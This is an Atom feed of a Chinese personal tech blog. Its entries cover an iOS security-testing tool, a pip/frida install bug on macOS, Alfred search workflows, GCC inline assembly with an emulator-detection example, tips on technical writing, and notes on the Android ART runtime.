<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FloatingGuy&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-05-23T13:26:10.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>FloatingGuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Needle初探</title>
    <link href="http://yoursite.com/2017/05/23/Needle%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2017/05/23/Needle初探/</id>
    <published>2017-05-23T13:24:31.000Z</published>
    <updated>2017-05-23T13:26:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>ios版的 drozer 工具，基于Frida实现，只能在越狱手机上使用。</p>
<a id="more"></a>
<p>功能：<br><a href="https://github.com/mwrlabs/needle.git" target="_blank" rel="external">https://github.com/mwrlabs/needle.git</a></p>
<p>安装：<br><a href="https://github.com/mwrlabs/needle/wiki/Installation-Guide" target="_blank" rel="external">https://github.com/mwrlabs/needle/wiki/Installation-Guide</a></p>
<p>安装包：<br><a href="https://github.com/mwrlabs/needle/releases" target="_blank" rel="external">https://github.com/mwrlabs/needle/releases</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ios版的 drozer 工具，基于Frida实现，只能在越狱手机上使用。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[Bug] pip 安装module的bug</title>
    <link href="http://yoursite.com/2017/05/22/Bug-pip-%E5%AE%89%E8%A3%85module%E7%9A%84bug/"/>
    <id>http://yoursite.com/2017/05/22/Bug-pip-安装module的bug/</id>
    <published>2017-05-22T06:17:39.000Z</published>
    <updated>2017-05-23T13:21:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>$ pip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 552, in resolve</div><div class="line">    raise DistributionNotFound(req)</div><div class="line">pkg_resources.DistributionNotFound: pip==9.0.1</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<h1 id="故事"><a href="#故事" class="headerlink" title="故事"></a>故事</h1><p>参考：<a href="https://www.zhihu.com/question/30941329" target="_blank" rel="external">Mac OS X 上如何切换默认的 Python 版本？</a></p>
<p>因为 mac 上自带的python 使用pip 安装失败， 是因为 SIP 对目录权限的限制，所以我自己安装python-2.7.13使用brew。<br>我之前一直 使用python-2.7.10, 将模块几乎都安装在 <code>/Library/Python/2.7/site-packages/</code>这里。</p>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>自从 有一次要升级frida 要安装frida 10.0.6, 安装新版本之前是可以使用但是pip 有下面bug。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜  Reverse  pip</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;/usr/local/bin/pip&quot;, line 6, in &lt;module&gt;</div><div class="line">    from pkg_resources import load_entry_point</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 2671, in &lt;module&gt;</div><div class="line">    working_set.require(__requires__)</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 654, in require</div><div class="line">    needed = self.resolve(parse_requirements(requirements))</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 552, in resolve</div><div class="line">    raise DistributionNotFound(req)</div><div class="line">pkg_resources.DistributionNotFound: pip==9.0.1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">* pypi  下载  egg</div><div class="line">* sudo easy_install  xx.egg</div></pre></td></tr></table></figure>
<p>下载frida10.0.6 的egg 文件，使用easy_install 安装以后，frida 也出现了 类似pip 的bug.<br>此时 将frida-10.0.6 默认安装在了 <code>/usr/local/lib</code> 目录，是因为我使用的 easy_install 在<code>/usr/local/bin</code> 目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  Reverse  frida</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;/usr/local/bin/frida&quot;, line 6, in &lt;module&gt;</div><div class="line">    from pkg_resources import load_entry_point</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 2675, in &lt;module&gt;</div><div class="line">    parse_requirements(__requires__), Environment()</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 552, in resolve</div><div class="line">    raise DistributionNotFound(req)</div><div class="line">pkg_resources.DistributionNotFound: frida==10.0.6</div></pre></td></tr></table></figure>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>参考 <a href="https://github.com/Homebrew/legacy-homebrew/issues/26900" target="_blank" rel="external">brew 的issue</a></p>
<p>按照文章中所说出现bug的原因是 老版本的pip 还在pip的启动脚本。我查看了 <code>/usr/local/bin/pip</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line"></div><div class="line">所以我将`/usr/local/lib/python2.7/site-packages/frida-10.0.6-py2.7-macosx-10.12-x86_64.egg` 文件移动到了 `/Library/Python/2.7/site-packages` 目录下。  其实 只要不在 `/usr/local/lib` 目录下即可以。</div><div class="line"></div><div class="line">感觉是因为 python 环境变量 `echo $PYTHONPATH` 中没有包含 `/usr/local/lib` , 但是 我测试将 `/usr/local/lib/python2.7/site-packages/frida-10.0.6-py2.7-macosx-10.12-x86_64.egg`  放到其他不在 `$PYTHONPATH` 列表中的目录也可以工作了。 所以我现在 不确定 将egg 移走原因。</div></pre></td></tr></table></figure>
<p>.:/usr/lib/python2.7:/Library/Python/2.7/site-packages:/usr/lib/python2.7/lib-dynload:/usr/lib/python2.7/lib-tk:/usr/lib/python2.7/site-packages:/usr/lib/python2.7/plat-darwin:/usr/lib/python2.7/plat-mac:/Users/xxx/.python/2.7.10/site-packages/:/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python:/Users/xxx/.pylib/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">可以继续玩耍了。</div></pre></td></tr></table></figure></p>
<p>➜  Reverse  pip –version<br>pip 9.0.1 from /Library/Python/2.7/site-packages/pip-9.0.1-py2.7.egg (python 2.7)</p>
<p>➜  Reverse  frida  –version<br>10.0.6<br>```</p>
<h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><p><a href="https://gist.github.com/miminus/671de665a440ef12cafc31e7a97acc89" target="_blank" rel="external">为Mac 设置Python多版本开发环境</a>  这篇文章 里的 pyenv 我已经使用brew 安装， 看了 作者的介绍，我觉得适合我  测试一些工具。稍后尝试。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;$ pip&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; File &amp;quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&amp;quot;, line 552, in resolve&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    raise DistributionNotFound(req)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pkg_resources.DistributionNotFound: pip==9.0.1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="bug" scheme="http://yoursite.com/tags/bug/"/>
    
  </entry>
  
  <entry>
    <title>Aflred 创建workflows</title>
    <link href="http://yoursite.com/2017/05/22/Aflred-%E5%88%9B%E5%BB%BAworkflows/"/>
    <id>http://yoursite.com/2017/05/22/Aflred-创建workflows/</id>
    <published>2017-05-22T04:49:30.000Z</published>
    <updated>2017-05-23T13:22:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Mac 上的Aflred 功能很强大，基本上算是Mac系统的『大管家』</p>
<p>按照我的使用习惯，基本将Aflred 的功能分成2部分。</p>
<ul>
<li>原生功能 ：指安装以后自带的功能</li>
<li>拓展功能 ：通过编写 Workflows 增强的功能<a id="more"></a>
</li>
</ul>
<h1 id="原生功能"><a href="#原生功能" class="headerlink" title="原生功能"></a>原生功能</h1><p><img src="/include/img/base_features.png" alt=""></p>
<p>原生功能包括了对mac 常用app的调用以及<code>本地文件搜索</code>。</p>
<p>像锁屏、关键、休眠等都是我常用的功能。</p>
<h1 id="拓展功能"><a href="#拓展功能" class="headerlink" title="拓展功能"></a>拓展功能</h1><p><img src="/include/img/workflows.png" alt=""></p>
<p>参考<a href="http://manan.org/2014/12/alfred-workflow-tutorial/" target="_blank" rel="external">Alfred workflow开发实例</a>这篇文章，我们开始写自己的Workflows。</p>
<p>四类对象:</p>
<ul>
<li>输入</li>
<li>输出</li>
<li>动作</li>
<li>触发</li>
</ul>
<p>每一种对象还包含 好几种Type， 这里不展开了感兴趣可以自己尝试。</p>
<h2 id="搜索公开情报的-WF"><a href="#搜索公开情报的-WF" class="headerlink" title="搜索公开情报的 WF"></a>搜索公开情报的 WF</h2><h3 id="使用Google-–-inurl"><a href="#使用Google-–-inurl" class="headerlink" title="使用Google – inurl"></a>使用Google – inurl</h3><p>对于程序员来说可能最重要的互联网工具就是Google，用好Goolge 可以大大提高工作效率。<br>特别是一些高级用法比如使用<code>inurl:</code> 可以在限定搜索url中含指定关键词的网页。<br>更多的使用方法：<a href="http://wdxtub.com/2016/03/26/google-tip/" target="_blank" rel="external">Google 搜索技巧</a></p>
<p><img src="/include/img/pi.png" alt=""></p>
<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>这个WF 只使用了 Input 和 Action 两个对象。<br><code>Input</code> : 创建<code>Keyword</code>类型的对象，设置 Aflred的搜索关键词。<br><code>Action</code>: 创建<code>Open URL</code>类型的对象，因为我们要使用Goolge inurl 搜索关键词。</p>
<p>当前创建了2个Input 和 3个Action，每个Action 代表1个要搜索的公开情报平台。</p>
<p>2个Input 对应的关键词：</p>
<ul>
<li><code>pi</code> 在所有收集的Platforms 搜索 关键次</li>
<li><code>pi-xw</code> 只在玄武实验室搜索</li>
</ul>
<p>3个Action 对应的Platform：</p>
<ul>
<li>xuanwulab.github.io</li>
<li>mdsec.co.uk</li>
<li>secspace.com</li>
</ul>
<p>在 Action 的URL 设置：<br><code>https://www.google.com/search?rlz=1C5CHFA_enJP663JP663&amp;q=inurl%3Axuanwulab.github.io++{query}</code></p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>后续只需要添加 Action 就可以了，如果需要单独搜索(pi-xx)就创建对应的Input.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Mac 上的Aflred 功能很强大，基本上算是Mac系统的『大管家』&lt;/p&gt;
&lt;p&gt;按照我的使用习惯，基本将Aflred 的功能分成2部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原生功能 ：指安装以后自带的功能&lt;/li&gt;
&lt;li&gt;拓展功能 ：通过编写 Workflows 增强的功能
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>C内敛汇编</title>
    <link href="http://yoursite.com/2017/05/18/%E5%BC%80%E5%8F%91/C%E5%86%85%E6%95%9B%E6%B1%87%E7%BC%96/"/>
    <id>http://yoursite.com/2017/05/18/开发/C内敛汇编/</id>
    <published>2017-05-18T07:01:39.000Z</published>
    <updated>2017-05-23T13:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：<a href="http://www.voidcn.com/blog/beyond702/article/p-6152486.html" target="_blank" rel="external">Arm汇编学习笔记(三)——GCC内联汇编</a></p>
<a id="more"></a>
<p>首先，C语言中为什么要内联汇编以及其带来的好处这个我就不说了。C语言中使用汇编要通过函数<code>asm()</code>，即<code>__asm__()</code>的别名，两者是一样的。</p>
<p>常见的内联汇编有下面两种形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">&quot;mov     r0, r0\n\t&quot;</div><div class="line">&quot;mov     r0, r0\n\t&quot;</div><div class="line">&quot;mov     r0, r0\n\t&quot;</div><div class="line">&quot;mov     r0, r0&quot;</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>例1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">&quot;mov %[result], %[value], ror #1&quot;</div><div class="line">: [result] &quot;=r&quot; (y)</div><div class="line">: [value] &quot;r&quot; (x)</div><div class="line">:</div><div class="line">);</div></pre></td></tr></table></figure>
<p>例2</p>
<p>第一种和一般汇编文件中的汇编程序是一的，这里不多说了。<br>着重看第二种，为什么要有第二种形式呢？这就和为什么内联汇编有很大关系了，一般都是在一个C的函数中会使用内联汇编，汇代码一般会与C函数的代码有数据交换，也就是说通过汇编代码来操作C代码中的一些变量数据，而C代码中的数据存放在内存还是寄存器，或者存放在哪个寄存器我们在写C代码的时候并不知道，所以不可能使用第一种内联汇编形式，那就必须要用第二种形式了。</p>
<h1 id="第二种汇编格式定义："><a href="#第二种汇编格式定义：" class="headerlink" title="第二种汇编格式定义："></a>第二种汇编格式定义：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">code    /*汇编指令*/</div><div class="line">: output operand list     /*输出操作数列表*/</div><div class="line">: input operand list      /*输入操作数列表*/</div><div class="line">: clobber list               /*被改变资源列表*/</div><div class="line">);</div></pre></td></tr></table></figure>
<p>可以内联汇编通过冒号将内容分成了四个部分，内联汇编和C操作数之前的关联性体现在上面的input和out操作数上。下面我们针对例2进行分析：</p>
<ul>
<li><p>汇编指令<br><code>mov %[result], %[value], ror #1</code></p>
</li>
<li><p>输出操作数列表，可选，每个输出数的符号名用方括号包围，后面跟一个约束串，然后再加上一个括号包围的C表达式，这个括号里的符号就是C语言代码中的变量。</p>
</li>
</ul>
<p><code>[result] &quot;=r&quot; (y) /*result：符号名   &quot;=r&quot;：约束串*    (y)：C表达式*/</code></p>
<ul>
<li><p>输入操作数列表，可选，语法上与输出操作数列表一样。括号中的x是C语言代码中的变量。<br><code>[value] &quot;r&quot; (x)</code></p>
</li>
<li><p>被改变资源列表，这里是空的，它主要是 <em>告诉编译器哪些资源发生了改变需要去更新</em> 。</p>
</li>
</ul>
<p>那么上面的”r”和”=r”是什么意思呢？</p>
<h2 id="operand"><a href="#operand" class="headerlink" title="operand"></a>operand</h2><table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>通用寄存器 r0-r15</td>
</tr>
<tr>
<td>m</td>
<td>有效的内存地址</td>
</tr>
<tr>
<td>I</td>
<td>数据处理中的立即数</td>
</tr>
<tr>
<td>X</td>
<td>只能 用于输出操作数列表</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>无</td>
<td>操作符只读</td>
</tr>
<tr>
<td>=</td>
<td>操作符只写</td>
</tr>
<tr>
<td>+</td>
<td>操作符 可读可写</td>
</tr>
<tr>
<td>&amp;</td>
<td>只能用于 <em>修饰输出操作数列表的操作符</em></td>
</tr>
</tbody>
</table>
<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>如果你曾经读过一些别人写的内联汇编代码就会发现与我们上面写的略有不同，是下面这种形式的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">&quot;mov %0, %1, ror #1&quot;</div><div class="line">: &quot;=r&quot; (result)</div><div class="line">: &quot;r&quot; (value)</div><div class="line">:</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>例3</p>
<p>实际上是同一种形式，只不过例2的那种形式是从GCC3.1版本开始才支持的，而再次之前一直是例3的形式。我之前对”%0” “%1”一直很迷惑，操作数用一个带百分号的数字来表示，上述0%和1%分别表示第一个、第二个操作数。GCC的最新版本仍然支持上述语法，但明显，上述语法更容易出错，且难以维护：假设你写一个较长的内联汇编，然后需要在某个位置插入一个新的输出操作数，此时，之后的操作数都需要重新编号。</p>
<p>另外还有一点就是，你会经常看见<code>asm volatile()</code>这样的内联汇编，在asm后面会跟上一个volatile关键字，这是因为编译器会去优化你的代码，不同的C编译器优化的方式还不一样，而这些优化有时候会适得其反，或者运行的过程和你希望的不一样，甚至将你的汇编代码给优化掉。针对这一问题的解决方法是增加volatile属性，这一属性告诉编译器不要对本代码段进行优化。</p>
<h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p><a href="https://github.com/Fuzion24/AndroidHostileEnvironmentDetection/blob/master/app/jni/emudetect.c" target="_blank" rel="external">https://github.com/Fuzion24/AndroidHostileEnvironmentDetection/blob/master/app/jni/emudetect.c</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">#ifdef __amd64__</div><div class="line">    __asm__ __volatile__ ( &quot;mov %0, %%rbx;&quot;</div><div class="line">        &quot;movl $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;</div><div class="line">        :</div><div class="line">        :&quot;c&quot;(&amp;global_value)</div><div class="line">    );</div><div class="line">#endif</div><div class="line">#ifdef __arm__</div><div class="line">    __asm__ __volatile__ (&quot;mov r0, %[global];&quot;</div><div class="line">        &quot;mov r1, #1;&quot;</div><div class="line">        &quot;add r1, r1, #1;&quot; &quot;str r1, [r0];&quot;</div><div class="line">        &quot;add r1, r1, #1;&quot; &quot;str r1, [r0];&quot;</div><div class="line">        &quot;add r1, r1, #1;&quot; &quot;str r1, [r0];&quot;</div><div class="line">        :</div><div class="line">        :[global] &quot;r&quot; (&amp;global_value)</div><div class="line">        );</div><div class="line">#endif</div><div class="line">#ifdef __i386__</div><div class="line">    __asm__ __volatile__ (</div><div class="line">        &quot;movl %0, %%ebx;&quot;</div><div class="line">        &quot;movl $1, (%%ebx);&quot;</div><div class="line">        &quot;add $1, (%%ebx);&quot;</div><div class="line">        &quot;add $1, (%%ebx);&quot;</div><div class="line">        :</div><div class="line">        :&quot;c&quot;(&amp;global_value)</div><div class="line">        );</div><div class="line">#endif</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自：&lt;a href=&quot;http://www.voidcn.com/blog/beyond702/article/p-6152486.html&quot;&gt;Arm汇编学习笔记(三)——GCC内联汇编&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="C" scheme="http://yoursite.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>如何提高技术类文章写作水平？</title>
    <link href="http://yoursite.com/2017/05/17/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%8A%80%E6%9C%AF%E5%86%99%E4%BD%9C%E6%B0%B4%E5%B9%B3%EF%BC%9F/"/>
    <id>http://yoursite.com/2017/05/17/如何提高技术写作水平？/</id>
    <published>2017-05-17T06:31:30.000Z</published>
    <updated>2017-05-23T13:28:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>本文的观点参考　知乎－<a href="https://www.zhihu.com/question/20896970" target="_blank" rel="external">《可以从哪些方面加强技术博客的写作能力？》</a> </p>
<a id="more"></a>
<blockquote>
<p>做技术时间长了发现如果没有好的写作习惯真的不行。</p>
</blockquote>
<p>首先，如果不通过写作分享做过的技术，那么自己对技术本身的理解可能就处在一种模糊的状态。写作的过程就是，<font color="red" size="4"><strong>我理解技术的原理，现在我要告诉别人，以后告诉我自己</strong></font>; 其次，就是工作产出大部分都是以文档+代码的形式，代码几乎都是自己看所以要把文档写好。</p>
<blockquote>
<p>如果写了但是自己都不愿意看，那写的东西就没有了意义，所以要提高写作水平。</p>
</blockquote>
<p><strong>如何提高写作水平</strong> 是本文要重点讨论的问题，这里不展开。不过在写作之前，自己心中就有一个想法 <strong> 我写的东西要实用，　要简洁</strong>。</p>
<h1 id="衡量水平"><a href="#衡量水平" class="headerlink" title="衡量水平"></a>衡量水平</h1><p>初学者写文章开始人物、时间、地点、事件四要素都不能齐全，写不出长的文章，自己所谓的原创就是几个互不相干的句子组合而成；待水平提高后，能写长一点的文章，但是拖泥带水，干货太少，写了很多可以直接删除的东西，大多数人居于这个写作层次；写作水平再上一个台阶，又会发现动笔就是长文，洋洋洒洒地几千字甚至上万仍意犹未尽，且行文流畅，这时候写作水平已经基本合格了，但是文章该是有长有短，这个水平阶段写不了短小精干的短文；如果写作水平能再前进一步，则是能长能短、能硬能软、能屈能伸……别想歪了。</p>
<p>毫无疑问，笔者在初级。。。。</p>
<h1 id="改进的方法"><a href="#改进的方法" class="headerlink" title="改进的方法"></a>改进的方法</h1><ol>
<li>看一些入门写作的书，学习基础技巧。控制<code>上下文不连贯，语病，乱用标点</code></li>
<li>动笔前，要理清思路，明确自己想要说什么，想表达什么意思。</li>
<li>动笔时，行文要流畅，章节要分清，有主有次；减少病句出现；合适用词，正确使用标点符号。</li>
<li>动笔后，检查再检查。当初我刚写作时候，我就是每次写完，打印出来修改上5、6遍。以后写作水平提高了就可以偷工减料了。</li>
<li>练。三天不写手生，那也不是瞎练。你的博客可以吹水咯屁，但是隔那么几天得有一两篇是认认真真写出来的，那么不出三个月，写作水平会大有提高。</li>
<li>看，模仿。可以看看公知的文章，看看他们怎么写的，思索如果自己动笔写会怎样写。</li>
<li>总结公知擅长的<code>甩包袱, 俏皮话</code></li>
<li>博览群书</li>
</ol>
<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo　"></a>Todo　</h1><ol>
<li>[维护] 文字片段(上面第７点)</li>
<li>一年读书不少于10本</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文的观点参考　知乎－&lt;a href=&quot;https://www.zhihu.com/question/20896970&quot;&gt;《可以从哪些方面加强技术博客的写作能力？》&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
      <category term="软实力" scheme="http://yoursite.com/tags/%E8%BD%AF%E5%AE%9E%E5%8A%9B/"/>
    
  </entry>
  
  <entry>
    <title>Android ART 虚拟机学习(一) -- 框架/模块</title>
    <link href="http://yoursite.com/2017/05/15/Android-ART-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E6%A1%86%E6%9E%B6-%E6%A8%A1%E5%9D%97/"/>
    <id>http://yoursite.com/2017/05/15/Android-ART-虚拟机学习-一-框架-模块/</id>
    <published>2017-05-15T14:03:37.000Z</published>
    <updated>2017-05-23T13:18:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>学习老罗的文章，简单记录一下<br><a href="http://blog.csdn.net/luoshengyang/article/details/39256813" target="_blank" rel="external">Android运行时ART简要介绍和学习计划</a><br><a id="more"></a></p>
<h1 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h1><p>JIT (just in time)执行本地机器指令<br>尽管Dalvik也会对频繁执行的代码进行JIT生成本地机器指令来执行，但毕竟在应用程序运行的过程中将Dex字节码翻译成本地机器指令也会影响到应用程序本身的执行，因此即使Dalvik使用了JIT，也在一定程度上也比不上直接就可以执行本地机器指令的运行时。</p>
<h1 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h1><p>Java 虚拟机接口 + 垃圾回收</p>
<p>APK 安装时走 AOT 流程<br>AOT(Ahead of Time)相对 Jit而言。AOT 要求 apk 安装时就要编译成本地机器指令。</p>
<h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>在ART中，打包在APK里面的Dex字节码是通过LLVM翻译成本地机器指令的。LLVM是一个用来快速开发自己的编译器的框架系统。</p>
<p>基于LLVM架构开发的编译器的执行过程如图2所示</p>
<p><img src="/include/img/LLVM.png" alt="LLVM.png"></p>
<ul>
<li><p>前端工具：对输入的源代码（Source Code）进行语法分析后，生成一棵抽象语法树（Abstract Syntax Tree，AST），并且可以进一步将得到的抽象语法树转化一种称为LLVM IR的中间语言。LLVM IR是一种与编程语言无关的中间语言</p>
</li>
<li><p>优化器：优化器对LLVM IR文件进行优化，例如消除代码里面的冗余计算</p>
</li>
<li>后端工具：后端负责生成最终的机器指令。</li>
</ul>
<p><img src="/include/img/LLVM2.png" alt="LLVM.png"></p>
